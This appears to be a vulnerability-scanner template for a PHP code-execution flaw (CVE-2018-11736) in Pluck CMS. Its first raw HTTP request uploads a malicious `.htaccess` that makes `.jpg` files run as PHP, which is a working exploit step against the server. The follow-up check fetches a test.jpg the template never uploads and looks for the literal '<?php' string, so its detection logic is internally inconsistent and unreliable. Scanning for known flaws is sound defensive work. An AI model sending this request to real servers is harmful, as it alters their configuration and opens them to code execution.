id: cve-2018-11736

info:
  name: Pluck 4.7.7-dev2 PHP Code Execution
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template checks for PHP code execution vulnerability in Pluck CMS 4.7.7-dev2 via uploading a malicious `.htaccess` file. Exploitation allows execution of PHP code using `.jpg` files.
  tags: php, rce, file-upload
  reference:
    - https://github.com/pluck-cms/pluck

http:
  - raw:
      - |
        POST /admin.php?action=images HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename=".htaccess"
        Content-Type: image/jpeg

        AddType application/x-httpd-php .jpg
        ------WebKitFormBoundary--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Upload successful"

  - raw:
      - |
        GET /images/test.jpg HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?php"
      - type: dsl
        dsl:
          - contains(body, "PHP")